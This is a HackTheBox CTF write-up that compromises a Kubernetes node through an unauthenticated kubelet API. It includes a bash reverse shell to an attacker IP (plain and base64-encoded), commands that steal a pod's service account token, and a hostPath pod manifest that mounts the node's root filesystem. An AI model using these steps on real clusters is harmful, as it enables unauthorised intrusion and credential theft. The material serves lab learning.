---
title: "HTB SteamCloud Writeup: Zero Credentials to Root Inside a Kubernetes Cluster"
date: 2026-10-24 00:00:00 +0800
categories: [CTF, HackTheBox]
tags: [HackTheBox, Kubernetes, Kubelet, Privilege Escalation, CTF]
---

# Target 10.129.96.167

## Network recon

### Rustscan

```bash
rustscan -a 10.129.96.167 --ulimit 5000 -g
```

```output
10.129.96.167 -> [22,2380,2379,10250,10256,10249]
```

### Nmap

```bash
nmap -sT -A -Pn -T5 -p 22,2380,2379,10250,10256,10249 10.129.96.167
```

```
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2
2379/tcp  open  ssl/etcd-client?
2380/tcp  open  ssl/etcd-server?
10249/tcp open  http             Golang net/http server
10250/tcp open  ssl/http         Golang net/http server
10256/tcp open  http             Golang net/http server
```

SSH aside, that port spread is unmistakable. 2379/2380 are etcd, and 10249/10250/10256 are the classic Kubernetes kubelet trio. The TLS certs on 2379 and 2380 even hand over the hostname for free: `commonName=steamcloud`. No guessing needed, this box is a Kubernetes node and the kubelet is clearly the thing to poke first.

## Web

```
https://steamcloud.htb:8443/
```

### Asset discovery

```bash
feroxbuster -k -u https://steamcloud.htb:8443// -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
```

```
200      GET       11l       20w      263c https://steamcloud.htb:8443/version
```

`/version` responding confirms 8443 is the Kubernetes API server itself. Good to know for later, once I actually have something to authenticate with.

Also worth a look while enumerating:

```
http://steamcloud.htb:10249/metrics
```

## Kubelet API

The kubelet API on port 10250 is notorious for allowing unauthenticated access to sensitive endpoints when anonymous auth hasn't been locked down, and that's exactly the case here:

```bash
curl https://10.129.96.167:10250/pods --insecure
```

```json
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {},
  "items": [
    {
      "metadata": {
        "name": "kube-scheduler-steamcloud",
        "namespace": "kube-system",
        ...
```

Full pod list, no auth required. Pulling the container images out with `gron` gives a nice overview of what's actually running on this node:

```bash
gron pods.json | grep "image =" | grep -v Statuses
```

```
json.items[0].spec.containers[0].image = "k8s.gcr.io/kube-scheduler:v1.22.3";
json.items[1].spec.containers[0].image = "k8s.gcr.io/etcd:3.5.0-0";
json.items[2].spec.containers[0].image = "k8s.gcr.io/kube-apiserver:v1.22.3";
json.items[3].spec.containers[0].image = "k8s.gcr.io/kube-controller-manager:v1.22.3";
json.items[4].spec.containers[0].image = "gcr.io/k8s-minikube/storage-provisioner:v5";
json.items[5].spec.containers[0].image = "k8s.gcr.io/kube-proxy:v1.22.3";
json.items[6].spec.containers[0].image = "k8s.gcr.io/coredns/coredns:v1.8.4";
json.items[7].spec.containers[0].image = "nginx:1.14.2";
```

All the usual control-plane components, plus one that stands out from the crowd: a bare `nginx:1.14.2` pod sitting in the default namespace. That's not a system component, that's a workload someone deployed, and it's the obvious place to go after.

### Enter kubeletctl

Rather than hand-crafting kubelet API calls, [kubeletctl](https://github.com/cyberark/kubeletctl) does the job cleanly:

```bash
wget https://github.com/cyberark/kubeletctl/releases/download/v1.13/kubeletctl_linux_amd64 \
  && chmod a+x ./kubeletctl_linux_amd64 \
  && mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
```

```bash
kubeletctl --server steamcloud.htb pods
```

```
┌───┬────────────────────────────────────┬─────────────┬─────────────────────────┐
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 4 │ nginx                              │ default     │ nginx                   │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 5 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│ 6 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│ 7 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│ 8 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
```

Same list, nicer table. Running kubeletctl's built-in RCE scan confirms what the stray `nginx` pod was hinting at:

```bash
kubeletctl --server steamcloud.htb scan rce
```

The `nginx` pod comes back vulnerable to RCE through the kubelet's exec endpoint. That means I can run arbitrary commands inside it without ever touching the container image itself.

### Shell inside the nginx pod

```bash
kubeletctl --server 10.129.96.167 exec "id" -p nginx -c nginx
```

```
uid=0(root) gid=0(root) groups=0(root)
```

Root inside the container already, though obviously that's just container root, not node root. First attempt at a proper reverse shell didn't come back:

```bash
sh -i >& /dev/tcp/10.10.14.170/4242 0>&1
```

Quoting through kubeletctl's exec was clearly mangling it, so I base64-encoded the payload instead to sidestep the issue entirely:

```bash
kubeletctl --server 10.129.96.167 exec \
  "echo 'c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTcwLzQyNDIgMD4mMQo=' | base64 -d | sh" \
  -p nginx -c nginx
```

That didn't worked also.

The real way forward was always going to be the Kubernetes service account, since every pod gets one mounted automatically unless explicitly disabled:

```bash
kubeletctl --server 10.129.96.167 exec \
  "ls /var/run/secrets/kubernetes.io/serviceaccount" -p nginx -c nginx
```

```
ca.crt  namespace  token
```

Exactly what I needed. Pulling both out:

```bash
kubeletctl --server 10.129.96.167 exec \
  "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee token

kubeletctl --server 10.129.96.167 exec \
  "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee ca.crt
```

With the service account token and the cluster CA cert in hand, I can now talk to the real Kubernetes API server on 8443 directly, as the pod's service account:

```bash
export token=$(cat token)
```

```bash
kubectl --token="$token" \
  --certificate-authority=./ca.crt \
  --server=https://10.129.96.167:8443 \
  get pods
```

```
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          11h
```

It works. Now the question is what this service account is actually allowed to do.

## Privilege escalation

```bash
kubectl --token="$token" \
  --certificate-authority=./ca.crt \
  --server=https://10.129.96.167:8443 \
  auth can-i --list
```

The `default` service account turns out to have permission to create pods, which, per the [well-known Kubernetes pod privilege escalation writeup from Bishop Fox](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation), is effectively game over. If you can create a pod on a node, you can create one that mounts the host's root filesystem straight into the container:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: nginx-bad
  namespace: default
spec:
  automountServiceAccountToken: true
  hostNetwork: true
  containers:
    - name: nginx-bad
      image: nginx:1.14.2
      volumeMounts:
        - mountPath: /root
          name: mount-root-into-mnt
  volumes:
    - name: mount-root-into-mnt
      hostPath:
        path: /
```

Deploying it:

```bash
kubectl --token="$token" \
  --certificate-authority=./ca.crt \
  --server=https://10.129.96.167:8443 \
  apply -f exploit2.yaml
```

```
pod/nginx-bad created
```

And from there, the node's entire filesystem is sitting under `/root` inside the new pod:

```bash
kubeletctl --server 10.129.96.167 exec "cat /root/root/root.txt" -p nginx-bad -c nginx-bad
```

Rooted. A single unauthenticated kubelet endpoint was enough to walk all the way from "no credentials at all" to full control of the underlying node.
